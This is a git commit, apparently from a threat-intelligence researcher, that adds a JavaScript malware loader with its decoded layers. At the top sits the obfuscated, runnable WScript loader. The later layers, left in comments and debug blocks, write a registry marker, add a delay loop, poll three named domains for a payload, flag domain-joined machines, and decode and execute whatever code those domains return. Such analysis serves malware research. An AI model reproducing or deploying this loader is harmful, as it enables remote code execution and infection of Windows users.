61450f51f351e16ba8262a3f36c2788bd718c83c
StrangerealIntel <54320855+StrangerealIntel@users.noreply.github.com>
2020-11-10 21:52:37 +0100

    Create DecodedJS.js

---
+++ UnknownJSLoader/2020-11-10/DecodedJS.js
@@ -0,0 +1,88 @@
+function modl(b) {return b % (m+m);}
+function init(a){
+base = '\"S\\+DN@kOD\"X\\RM2(EA8fSI+OUN\\x\"%%e@\"\\\\\"d\\)\"n( ,is! .g=07n )li\")\\rm=%t(=US(-St 1Enf)Rei Dm {Nn; SotWDrxSOiecMvTrAneiIEspNdnt%no.\"a\\spp)lsx eeE{er.kp.)X(5\\2\"128ly2=lh2ke 2Xh=22S )8.7;+tl \"p\\}mi2  r7erc8laS1svW4e \\6\"{ \"(\\{ t; )c}m0e l0jt72br  Oy==e{ =t m=ahl ey7sr1.uC5rt..eatoptpplsiea.rnc5c(e1S\'(\\Wy\\G\"h(E@( T\\ \"\'f\\+fi,ki  X ;\'2\\)}8h0 +t3;\\t\"e+p@s0s\\l\":7a,/,f\\/\" 2\'\\\\\"n(+)r]Z;u\\y\"t 8rev2tra[s rlb{ xu)t4sen5\\(\"]2h[+4c)\' \\(t=/ga sncmei}lar 7rt;.cS)rho(e.tdpp.nlh)eap(sc\'m\\e.o+(5d\"/\\n1(?ay\\e\\hrld .w{;he2)to}ead)sMv/l fga=x,f w  8ff,2ru8Xwn2kecX ytk;=i+)\"o\\\\\'\'(n4P9 QTP((T]I3H7Q-L657M[77X3)rrE }e;{)v\" erHrqeFeFS\"t(.fuO2xreLdnnMi .X4S1SXtSM;ri\\+\'4i1(XnSt=g4c1.XeSf{j)r+b+oiO m;e3C5t0h2a5a1e r<r CiC;o0. d=t eip(( irporfa;c\"rwSFsOWfea \"I ==n  4t15X(S1;I4y3QLhT5= p7j{M,g j1Y)O0 3}); 7+7<=34 30L5T) 4;;)x\" ZlS}_(G)E R;\"e  ,l\"E\"i r,h934wq7H ([e;t3i0r]W g(e=Rt. 9n75G2u4 4{x ))le(( h)c;t;a]c  \\}\" W;s)S9i4cqrHr(adiapepR.gtehR..c9Q7eGuut i{- tyir(ta;)\".\\;\\wz PwI}rwv \\\\\\\"E}R,A W\\T\"FeOgSl\\r\\sRoEeS.U _pT{NwE RoRWUdCS_nYcEiKrHw\"i \\=\" p9,4tq\\H\" .;r)s\"blll.eehmSe.otppci(r.c2SmW2\"p(2tdc2eaj2b.O)ewt;awe rwC}.\\t\"p i[rlc SxW= 4=  5927+G8u+;y4;3Z6}2\'=)o)b(gSvXc1g4y)f;tflkadddltTrnurqootvcbu=rEtrs3n7o;c ';
+p=a;}
+function addval(c,d) { return c+d; }
+function initVal(argp1)
+{
+    m=argp1;
+    Index=m+argp1*m+argp1;
+    arg=2106;
+}
+init(0,"jcSHX");
+function f(inarg) {r='';lim=p;while (lim < arg) {VU45=GetChar(inarg,lim,inarg);if (modl(lim)) r=addval(r,VU45); else r=addval(VU45,r); lim++; }return r;}
+function GetIndex() {code[Index] = init[code[p]];}
+initVal(1,"vcISAMT");
+function SplitData() {code = f(base).split(sep);}
+function GetChar(obj,c) {return obj.charAt(c);}
+function Exec() {code[Index](code[m])(code[m]);}
+sep="nTldal";
+SplitData("Vexkxue");
+GetIndex("PqJn");
+Exec(652);
+
+/* layer 2
+> Array ["constructor", "tfygcvgbo=2634;uG79 = WScript.CreateObject("WScript.Shell"); Hq49 = "HKEY_CURRENT_USER\\SOFTWARE\\vrIPz\\";try { uG79.RegRead(Hq49); } catch(e) { uG79.RegWrite(Hq49, "", "REG_SZ"); TL34=77;} OYjgMjp=TL34;SX14 = "afOFw";for (i = 0;i < 152053; i++){SX14=SX14+i;SX14.indexOf("FFqHe");}Er37[76-73](PQ94('\"+=kyXe2w8r,f wfxaflvsdeo)e;w lhey?1\"5+.\'spehnpd.(h)c;r a}ecsa/t\'c+h](5e4)x{l [r2e8tyuZr+n\' /f/a:lsspet;t h}\'  i,f\' T(EhGy\'1(5n.esptoa.t5u1sy h= ={=y r2t0 0}); \"{6 4v1a8r7 2m\"l+78 2=X kh=y8125X.kr{e s)p\"o%nNsIeATMeOxDtS;N DiRfE S(U(%m\"l 7=.!i n)d\"e%xNOIfA(M\"O@D\"S+NkDXR2E8S+U\"%@\"\"(,s g0n)i)r=t=S-t1n)e m{n oWrSicvrniEpdtn.asplxeEe.p)(\"2l2l2e2h2S).;t p}i reclSsWe\" ({t cmelj7b O=e tmale7r.Cr.etppliarcceS(W\"(@ \"f+ik X;2)80+3\"+@0\"7,,\"2\"()];\" rvtasrb utsn\"2[4) (=g nmilr7t.Sroetp.l)a(cmeo(d/n(a\\rd.{h2t}a)M/ g=,  8f2uXnkc t;i)o\'nP T(TIHQL5M7X)r e{v rreeSt.u2rLnM XSStMr\'i(ntgc.efjrboOmeCthaaerrCCo.dtep(ipracrSsWe I=n t5(1IyQh5 7{, 1)03) +<3 05)4;x l}() ;e lEirh3w7 [;30] (=t n5244x)l( );;] \"WsSicrraipp.th.cQeuti-ti(a).;w w}w \"}, \"eglrsoe. p{w oWdSncirwi\"p,t\".rsbl.emeopc(.2m2p2d2a2.)w;w w}\" [l x=4 52+8+y;Z}'))(SX14);fkddtruqovb=Er37; ", undefined, function Function() {
+    [native code]
+}]
+*/
+
+
+ /*layer 2 debug */
+ 
+> Array ["constructor", "tfygcvgbo=2634;
+shobj = WScript.CreateObject("WScript.Shell");
+ RegKey = "HKEY_CURRENT_USER\\SOFTWARE\\vrIPz\\";
+try { shobj.RegRead(RegKey);} 
+catch(e) 
+{
+	shobj.RegWrite(RegKey, "", "REG_SZ");
+	k=77;
+} 
+OYjgMjp=k;
+t = "afOFw";
+for (i = 0;i < 152053;i++)
+{
+	t=t+i;
+	t.indexOf("FFqHe");
+}
+code[76-73](f('\"+=kyXe2w8r,f wfxaflvsdeo)e;w lhey?1\"5+.\'spehnpd.(h)c;r a}ecsa/t\'c+h](5e4)x{l [r2e8tyuZr+n\' /f/a:lsspet;t h}\'  i,f\' T(EhGy\'1(5n.esptoa.t5u1sy h= ={=y r2t0 0}); \"{6 4v1a8r7 2m\"l+78 2=X kh=y8125X.kr{e s)p\"o%nNsIeATMeOxDtS;N DiRfE S(U(%m\"l 7=.!i n)d\"e%xNOIfA(M\"O@D\"S+NkDXR2E8S+U\"%@\"\"(,s g0n)i)r=t=S-t1n)e m{n oWrSicvrniEpdtn.asplxeEe.p)(\"2l2l2e2h2S).;t p}i reclSsWe\" ({t cmelj7b O=e tmale7r.Cr.etppliarcceS(W\"(@ \"f+ik X;2)80+3\"+@0\"7,,\"2\"()];\" rvtasrb utsn\"2[4) (=g nmilr7t.Sroetp.l)a(cmeo(d/n(a\\rd.{h2t}a)M/ g=,  8f2uXnkc t;i)o\'nP T(TIHQL5M7X)r e{v rreeSt.u2rLnM XSStMr\'i(ntgc.efjrboOmeCthaaerrCCo.dtep(ipracrSsWe I=n t5(1IyQh5 7{, 1)03) +<3 05)4;x l}() ;e lEirh3w7 [;30] (=t n5244x)l( );;] \"WsSicrraipp.th.cQeuti-ti(a).;w w}w \"}, \"eglrsoe. p{w oWdSncirwi\"p,t\".rsbl.emeopc(.2m2p2d2a2.)w;w w}\" [l x=4 52+8+y;Z}'))(t);
+c=code;
+ ", undefined, function Function() {
+    [native code]
+}]
+
+/* layer3 
+"Zy82 = ["www.adpm.com.br","windowp.org","www.ai-tech.paris"]; lx45 = 0; while (lx45 < 3) { hy15 = WScript.CreateObject('MSXML2.ServerXMLHTTP'); randval = Math.random().toString()["substr"](2,70+30); if (WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERDNSDOMAIN%") != "%USERDNSDOMAIN%") {randval=randval+"278146";} try{ hy15.open('GET', 'https://'+Zy82[lx45]+'/search.php'+"?elweodvfxwfrwey="+randval, false); hy15.send(); }catch(e){ return false; } if (hy15.status === 200) { var ml7 = hy15.responseText; if ((ml7.indexOf("@"+randval+"@", 0))==-1) { WScript.sleep(22222); } else { ml7 = ml7.replace("@"+randval+"@",""); var tn24 = ml7.replace(/(\d{2})/g, function (IQ57) { return String.fromCharCode(parseInt(IQ57,10)+30); }); Er37[3](tn24)(); WScript.Quit(); } } else { WScript.sleep(22222); } lx45++;}"
+*/
+
+/* layer3 debug */
+"timesrv = ["www.adpm.com.br","windowp.org","www.ai-tech.paris"]; 
+ inc = 0;
+ while (inc < 3) 
+ { 
+	 xmlObj = WScript.CreateObject('MSXML2.ServerXMLHTTP');
+	 randval = Math.random().toString()["substr"](2,100);
+	 if (WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERDNSDOMAIN%") != "%USERDNSDOMAIN%") {randval=randval+"278146";} 
+	 try
+	 {
+		 xmlObj.open('GET', 'https://'+timesrv[inc]+'/search.php'+"?elweodvfxwfrwey="+randval, false);
+		 xmlObj.send();
+	 }
+	 catch(e){ return false; } 
+	 if (xmlObj.status === 200) 
+	 {
+		 var rep = xmlObj.responseText;
+		 if ((rep.indexOf("@"+randval+"@", 0))==-1) { WScript.sleep(22222);} 
+		 else 
+		 { 
+			 rep = rep.replace("@"+randval+"@","");
+			 var payload = rep.replace(/(\d{2})/g, function (a) { return String.fromCharCode(parseInt(a,10)+30);});
+			 code[3](payload)();
+			 WScript.Quit();
+		 } 
+	} 
+	else { WScript.sleep(22222); } 
+	inc++;
+}"
+
